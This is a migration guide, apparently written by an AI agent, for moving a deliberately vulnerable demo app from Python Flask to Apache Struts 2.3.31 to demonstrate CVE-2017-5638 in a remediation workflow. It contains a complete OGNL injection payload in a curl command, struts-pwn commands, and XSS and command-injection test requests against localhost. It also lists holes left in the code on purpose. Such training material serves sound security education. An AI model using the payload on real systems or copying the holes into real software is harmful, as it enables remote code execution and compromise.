# Migration Guide: Python Flask App → Java Struts App

## Overview

This guide documents the migration from the original Python Flask vulnerable application to the new Java Apache Struts application demonstrating CVE-2017-5638 (Equifax breach).

## Table of Contents

1. [Why Migrate?](#why-migrate)
2. [Key Differences](#key-differences)
3. [Architecture Comparison](#architecture-comparison)
4. [Vulnerability Comparison](#vulnerability-comparison)
5. [Setup & Prerequisites](#setup--prerequisites)
6. [Running the Applications](#running-the-applications)
7. [Testing Comparison](#testing-comparison)
8. [Workflow Integration](#workflow-integration)
9. [Migration Checklist](#migration-checklist)

---

## Why Migrate?

### Rationale for Change

**From**: Generic Python Flask app with multiple synthetic vulnerabilities  
**To**: Java Struts app demonstrating real-world CVE-2017-5638 (Equifax breach)

### Benefits

1. **Real-World Relevance**: CVE-2017-5638 caused the 2017 Equifax breach affecting 147 million people
2. **Historical Significance**: Demonstrates an actual critical vulnerability with documented impact
3. **Industry Recognition**: Well-known case study in cybersecurity education
4. **Realistic Scenario**: Credit reporting application mirrors Equifax's actual business domain
5. **Exploitability**: Can be tested with real exploit tools (struts-pwn)
6. **Educational Value**: Teaches about OGNL injection, Apache Struts, and enterprise Java security

---

## Key Differences

### Technology Stack

| Aspect | Python Flask App | Java Struts App |
|--------|------------------|-----------------|
| **Language** | Python 3.x | Java 8 |
| **Framework** | Flask 1.1.2 / 3.1.3 | Apache Struts 2.3.31 |
| **Build Tool** | pip | Maven 3.6+ |
| **Server** | Flask dev server | Embedded Jetty |
| **Database** | SQLite (in-memory) | In-memory Java collections |
| **Port** | 5001 | 8080 |
| **Package Manager** | requirements.txt | pom.xml |

### Application Domain

| Aspect | Python Flask App | Java Struts App |
|--------|------------------|-----------------|
| **Domain** | Generic user management | Credit reporting (Equifax-like) |
| **Business Logic** | User CRUD, file operations | Credit checks, consumer data, disputes |
| **Data Model** | Users table (2 records) | Consumers (147 records), Credit reports |
| **Realism** | Educational example | Industry-specific scenario |

### Vulnerability Focus

| Aspect | Python Flask App | Java Struts App |
|--------|------------------|-----------------|
| **Primary CVE** | Multiple synthetic vulnerabilities | CVE-2017-5638 (Critical, CVSS 10.0) |
| **Vulnerability Type** | SQL injection, XSS, command injection, etc. | OGNL injection via Content-Type header |
| **Exploitability** | Theoretical demonstrations | Real exploit tool (struts-pwn) |
| **Historical Impact** | None (educational) | 2017 Equifax breach (147M records) |
| **Remediation** | Upgrade Flask/Werkzeug | Upgrade Struts 2.3.31 → 2.3.32+ |

---

## Architecture Comparison

### Python Flask Application

```
app/vulnerable/
├── .gitignore
├── main.py                 # 222 lines - All routes in one file
├── requirements.txt        # 7 dependencies
└── test_main.py           # 257 lines - 20 unit tests
```

**Architecture**: Monolithic single-file application

**Key Components**:
- Flask app with 14 routes
- SQLite database initialization
- Session management
- Multiple vulnerability types (14 different vulnerabilities)

**Endpoints**:
- `/` - Index page
- `/search` - SQL injection (query parameter)
- `/user/<id>` - SQL injection (path parameter)
- `/greet` - XSS vulnerability
- `/execute` - Command injection
- `/file` - Path traversal
- `/load` - Insecure deserialization
- `/api/data` - Missing CORS
- `/login` - Weak session management
- `/admin` - Insufficient authorization
- `/weather` - Safe requests usage (false positive demo)

### Java Struts Application

```
app/credit-app/
├── pom.xml                                    # Maven configuration
├── README.md                                  # 239 lines - Setup guide
├── EXPLOIT_GUIDE.md                          # 337 lines - Exploitation guide
├── src/main/java/com/creditapp/demo/
│   ├── actions/                              # Struts actions (MVC controllers)
│   │   ├── CreditCheckAction.java           # Credit check endpoint
│   │   ├── ConsumerDataAction.java          # Consumer data management
│   │   ├── DisputeAction.java               # Dispute management
│   │   └── FileUploadAction.java            # VULNERABLE file upload
│   ├── model/                                # Data models
│   │   ├── Consumer.java                     # Consumer entity
│   │   ├── CreditReport.java                # Credit report entity
│   │   └── Dispute.java                      # Dispute entity
│   └── service/                              # Business logic
│       ├── ConsumerService.java              # 147 mock consumers
│       └── CreditReportService.java          # Credit report generation
├── src/main/webapp/
│   ├── index.jsp                             # Modern home page
│   ├── file-upload.jsp                       # Vulnerable upload form
│   └── WEB-INF/
│       ├── web.xml                           # Servlet configuration
│       └── struts.xml                        # Struts action mappings
└── src/test/java/com/creditapp/demo/actions/
    ├── CreditCheckActionTest.java            # 3 tests
    ├── ConsumerDataActionTest.java           # 3 tests
    └── FileUploadActionTest.java             # 3 tests
```

**Architecture**: MVC pattern with separation of concerns

**Key Components**:
- Struts 2 MVC framework
- Action classes (controllers)
- Model classes (entities)
- Service layer (business logic)
- JSP views (presentation)
- Maven build system

**Endpoints**:
- `/credit-app/index.jsp` - Home page
- `/credit-app/check-credit.action` - Credit check
- `/credit-app/consumer-data.action` - Consumer data lookup
- `/credit-app/dispute.action` - Dispute management
- `/credit-app/upload.action` - **VULNERABLE** file upload (CVE-2017-5638)

---

## Vulnerability Comparison

### Python Flask App: Multiple Vulnerabilities

The Flask app demonstrates **14 different vulnerability types**:

1. **Hardcoded secret key** (Configuration)
2. **Hardcoded database credentials** (Configuration)
3. **Deprecated Flask attribute** (`request.is_xhr`)
4. **SQL Injection** (query parameter)
5. **SQL Injection** (path parameter)
6. **Cross-Site Scripting (XSS)**
7. **Command Injection**
8. **Path Traversal**
9. **Insecure Deserialization** (pickle)
10. **Missing CORS restrictions**
11. **Weak session management**
12. **Insufficient authorization**
13. **Debug mode in production**
14. **Binding to all interfaces (0.0.0.0)**

**Purpose**: Educational demonstration of common web vulnerabilities

**Exploitation**: Theoretical - requires manual crafting of payloads

### Java Struts App: CVE-2017-5638

The Struts app focuses on **one critical real-world vulnerability**:

**CVE-2017-5638**: Remote Code Execution via OGNL Injection

**Details**:
- **CVSS Score**: 10.0 (Critical)
- **Affected Versions**: Apache Struts 2.3.5 - 2.3.31, 2.5.0 - 2.5.10
- **Fixed Version**: 2.3.32, 2.5.10.1
- **Attack Vector**: Network (no authentication required)
- **Complexity**: Low
- **Impact**: Complete system compromise

**Vulnerability Mechanism**:
```
1. Attacker sends HTTP request with malicious Content-Type header
2. Jakarta Multipart Parser processes the header
3. OGNL expression in Content-Type is evaluated
4. Arbitrary code execution on server
```

**Example Exploit**:
```bash
# Using struts-pwn tool
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "id"

# Manual curl
curl -X POST http://localhost:8080/credit-app/upload.action \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

**Real-World Impact**: 2017 Equifax breach
- 147 million consumer records compromised
- Names, SSNs, birth dates, addresses, driver's licenses
- Credit card numbers for 209,000 consumers
- Dispute documents for 182,000 consumers
- $700 million settlement

**Purpose**: Demonstrate real-world critical vulnerability with documented impact

**Exploitation**: Automated with struts-pwn tool, well-documented exploit

---

## Setup & Prerequisites

### Python Flask App

**Prerequisites**:
```bash
# Python 3.x
python3 --version

# pip (usually comes with Python)
pip3 --version
```

**Setup**:
```bash
cd app/vulnerable

# Create virtual environment
python3 -m venv .venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run application
python main.py
```

**Access**: http://localhost:5001

### Java Struts App

**Prerequisites**:
```bash
# Java 8 (REQUIRED - Struts 2.3.31 incompatible with Java 11+)
java -version  # Should show 1.8.x

# Maven 3.6+
mvn --version
```

**Java 8 Installation** (if needed):
```bash
# Option 1: Homebrew (macOS)
brew install openjdk@8
export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)

# Option 2: SDKMAN
curl -s "https://get.sdkman.io" | bash
sdk install java 8.0.392-tem

# Option 3: Direct download
# Download from https://adoptium.net/temurin/releases/?version=8
```

**Setup**:
```bash
cd app/credit-app

# Build application
mvn clean package

# Run application
mvn jetty:run
```

**Access**: http://localhost:8080/credit-app/index.jsp

---

## Running the Applications

### Python Flask App

**Development Mode**:
```bash
cd app/vulnerable
python main.py
```

**Testing**:
```bash
# Run all tests
python -m unittest test_main.py

# Run specific test
python -m unittest test_main.VulnerableAppTestCase.test_search_users

# Verbose output
python -m unittest test_main.py -v
```

**Endpoints to Test**:
```bash
# Index page
curl http://localhost:5001/

# SQL Injection
curl "http://localhost:5001/search?q=admin"

# XSS
curl "http://localhost:5001/greet?name=<script>alert('XSS')</script>"

# Command Injection
curl "http://localhost:5001/execute?cmd=whoami"
```

### Java Struts App

**Development Mode**:
```bash
cd app/credit-app
mvn jetty:run
```

**Testing**:
```bash
# Run all tests
mvn test

# Run specific test class
mvn test -Dtest=CreditCheckActionTest

# Run specific test method
mvn test -Dtest=CreditCheckActionTest#testCreditCheckSuccess

# Clean and test
mvn clean test
```

**Endpoints to Test**:
```bash
# Home page
curl http://localhost:8080/credit-app/index.jsp

# Credit check
curl -X POST http://localhost:8080/credit-app/check-credit.action \
  -d "ssn=123-45-6789"

# Consumer data
curl -X POST http://localhost:8080/credit-app/consumer-data.action \
  -d "consumerId=1"

# Vulnerable upload (CVE-2017-5638)
python struts-pwn.py --url http://localhost:8080/credit-app/upload.action -c "id"
```

---

## Testing Comparison

### Python Flask App Tests

**Test Framework**: Python unittest  
**Test File**: `test_main.py` (257 lines)  
**Test Count**: 20 unit tests + 2 database tests

**Test Categories**:
1. **Basic Functionality** (8 tests)
   - Index page loading
   - AJAX detection
   - Search functionality
   - User profile retrieval
   - Greeting endpoint
   - Command execution
   - File reading
   - Load data form

2. **API Endpoints** (4 tests)
   - API data endpoint
   - Login functionality
   - Admin access (with/without auth)
   - Content type headers

3. **Database Operations** (4 tests)
   - Database initialization
   - User insertion
   - Database creation
   - Query operations

4. **Edge Cases** (4 tests)
   - Empty queries
   - Invalid user IDs
   - Special characters
   - Concurrent requests

**Running Tests**:
```bash
cd app/vulnerable
python -m unittest test_main.py

# Output:
# ....................
# ----------------------------------------------------------------------
# Ran 20 tests in 0.123s
# OK
```

### Java Struts App Tests

**Test Framework**: JUnit 4  
**Test Files**: 3 test classes  
**Test Count**: 9 unit tests

**Test Classes**:

1. **CreditCheckActionTest** (3 tests)
   - `testCreditCheckSuccess()` - Valid SSN returns credit report
   - `testCreditCheckInvalidSSN()` - Invalid SSN returns error
   - `testCreditCheckMissingSSN()` - Missing SSN returns input form

2. **ConsumerDataActionTest** (3 tests)
   - `testConsumerDataSuccess()` - Valid ID returns consumer data
   - `testConsumerDataInvalidId()` - Invalid ID returns error
   - `testConsumerDataMissingId()` - Missing ID returns input form

3. **FileUploadActionTest** (3 tests)
   - `testFileUploadSuccess()` - Valid file upload succeeds
   - `testFileUploadNoFile()` - No file returns input form
   - `testFileUploadInvalidType()` - Invalid file type returns error

**Running Tests**:
```bash
cd app/credit-app
mvn test

# Output:
# [INFO] Tests run: 9, Failures: 0, Errors: 0, Skipped: 0
# [INFO] BUILD SUCCESS
```

**Test Coverage**:
- All Struts actions tested
- Success and error paths covered
- Input validation tested
- Business logic verified

---

## Workflow Integration

### GitHub Actions Workflow Changes

The `.github/workflows/bob-shell-v2.yml` workflow was updated to support both applications:

#### Application Type Detection

```yaml
- name: Detect Application Type
  id: detect-app
  run: |
    if [ -f "app/credit-app/pom.xml" ]; then
      echo "app_type=java" >> $GITHUB_OUTPUT
      echo "app_dir=app/credit-app" >> $GITHUB_OUTPUT
      echo "Detected Java application"
    elif [ -f "app/vulnerable/requirements.txt" ]; then
      echo "app_type=python" >> $GITHUB_OUTPUT
      echo "app_dir=app/vulnerable" >> $GITHUB_OUTPUT
      echo "Detected Python application"
    else
      echo "app_type=unknown" >> $GITHUB_OUTPUT
      echo "app_dir=." >> $GITHUB_OUTPUT
      echo "Unknown application type"
    fi
```

#### Java-Specific Setup

```yaml
- name: Set up Java 8
  if: steps.detect-app.outputs.app_type == 'java'
  uses: actions/setup-java@v4
  with:
    distribution: 'temurin'
    java-version: '8'
    cache: 'maven'
```

#### Test Execution

```yaml
- name: Run Unit Tests
  id: run-tests
  run: |
    cd ${{ steps.detect-app.outputs.app_dir }}
    
    if [ "${{ steps.detect-app.outputs.app_type }}" == "python" ]; then
      python -m unittest test_main.py
    elif [ "${{ steps.detect-app.outputs.app_type }}" == "java" ]; then
      mvn clean test
    fi
```

### Workflow Stages

Both applications follow the same 4-stage workflow:

1. **DevOps Phase** - Bob Shell researches CVE and creates remediation PR
2. **DevOps Approval** - DevOps engineer reviews package changes
3. **Unit Testing** - Automated tests verify compatibility
4. **Code Remediation** - Bob Shell fixes code if tests fail

### False Positive Detection

The false positive detection workflow continues to work with both applications:

**Python Example**: `requests` library CVE
- Analyzes if vulnerable functions are actually called
- Checks if service is exposed to untrusted users
- Determines if CVE is exploitable in context

**Java Example**: Struts CVE-2017-5638
- Analyzes if file upload endpoint is used
- Checks if Jakarta Multipart Parser is configured
- Determines if vulnerability is reachable

---

## Migration Checklist

### Pre-Migration

- [x] Review Python Flask app functionality
- [x] Understand existing vulnerabilities
- [x] Document current workflow integration
- [x] Identify test coverage requirements

### Implementation

- [x] Research CVE-2017-5638 and Equifax breach
- [x] Design Java application architecture
- [x] Create Maven project structure
- [x] Implement Struts actions and models
- [x] Add 147 mock consumer records
- [x] Create JSP views
- [x] Write comprehensive unit tests (9 tests)
- [x] Verify all tests pass

### Documentation

- [x] Create README.md (239 lines)
- [x] Create EXPLOIT_GUIDE.md (337 lines)
- [x] Create implementation plan (847 lines)
- [x] Create implementation summary (437 lines)
- [x] Update main README.md
- [x] Create this migration guide

### Testing

- [x] Verify application builds successfully
- [x] Verify application runs on port 8080
- [x] Test all endpoints manually
- [x] Verify unit tests pass (9/9)
- [x] Test exploitation with struts-pwn
- [x] Verify RCE works (command execution confirmed)

### Workflow Integration

- [x] Update GitHub Actions workflow
- [x] Add Java 8 setup
- [x] Add Maven cache
- [x] Add application type detection
- [x] Add Maven test execution
- [x] Verify backward compatibility with Python app
- [x] Test false positive detection compatibility

### Cleanup

- [ ] Remove old Python Flask app (`app/vulnerable/`)
- [ ] Update references in documentation
- [ ] Archive Python app (if needed for reference)
- [ ] Update Concert ingestion configuration

### Post-Migration

- [ ] Test complete workflow end-to-end
- [ ] Verify Concert CVE detection
- [ ] Test automated remediation
- [ ] Validate all 4 workflow stages
- [ ] Create demo video/walkthrough
- [ ] Update presentation materials

---

## Troubleshooting

### Common Issues

#### Java Version Mismatch

**Problem**: `ArrayIndexOutOfBoundsException` or `InaccessibleObjectException`

**Cause**: Struts 2.3.31 requires Java 8 (incompatible with Java 11+)

**Solution**:
```bash
# Check Java version
java -version

# Should show: java version "1.8.0_xxx"
# If not, install Java 8 and set JAVA_HOME
export JAVA_HOME=$(/usr/libexec/java_home -v 1.8)
```

#### Missing Dependencies

**Problem**: `NoClassDefFoundError: CompressorException`

**Cause**: commons-compress not included in pom.xml

**Solution**: Already fixed in pom.xml (lines 65-69)

#### Port Already in Use

**Problem**: `Address already in use: bind`

**Cause**: Another application using port 8080

**Solution**:
```bash
# Find process using port 8080
lsof -i :8080

# Kill the process
kill -9 <PID>

# Or change port in pom.xml
<jetty.http.port>8081</jetty.http.port>
```

#### Exploit Not Working

**Problem**: struts-pwn shows "Connection Closed Prematurely"

**Cause**: This is expected behavior - exploit still works

**Solution**: Check command output in response, ignore warning

---

## Summary

### What Changed

| Aspect | Before | After |
|--------|--------|-------|
| **Language** | Python | Java |
| **Framework** | Flask | Apache Struts 2 |
| **Vulnerability** | Multiple synthetic | CVE-2017-5638 (real) |
| **Domain** | Generic | Credit reporting |
| **Realism** | Educational | Historical breach |
| **Exploitation** | Manual | Automated (struts-pwn) |
| **Impact** | None | 147M records (Equifax) |

### What Stayed the Same

- ✅ Concert + Bob workflow integration
- ✅ False positive detection capability
- ✅ 4-stage remediation process
- ✅ GitHub Actions automation
- ✅ Unit testing requirements
- ✅ Documentation standards

### Benefits of Migration

1. **Real-World Relevance**: Actual CVE with documented impact
2. **Educational Value**: Teaches about enterprise Java security
3. **Industry Recognition**: Well-known case study
4. **Exploitability**: Can be tested with real tools
5. **Realistic Scenario**: Credit reporting domain mirrors Equifax
6. **Historical Significance**: 2017 breach affecting 147M people

### Next Steps

1. Remove old Python Flask app
2. Test complete workflow end-to-end
3. Verify Concert integration
4. Create demo presentation
5. Update training materials

---

## References

### CVE-2017-5638 Resources

- **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- **Apache Advisory**: https://cwiki.apache.org/confluence/display/WW/S2-045
- **Equifax Breach**: https://investor.equifax.com/news-events/press-releases/detail/237/
- **Black Duck Analysis**: https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html
- **struts-pwn Tool**: https://github.com/mazen160/struts-pwn

### Documentation

- **Java App README**: `app/credit-app/README.md`
- **Exploit Guide**: `app/credit-app/EXPLOIT_GUIDE.md`
- **Implementation Plan**: `docs/EQUIFAX_CVE_2017_5638_IMPLEMENTATION_PLAN.md`
- **Implementation Summary**: `docs/JAVA_APP_IMPLEMENTATION_SUMMARY.md`

---

**Migration Date**: June 9, 2026  
**Author**: Bob (AI Software Engineer)  
**Status**: Complete ✅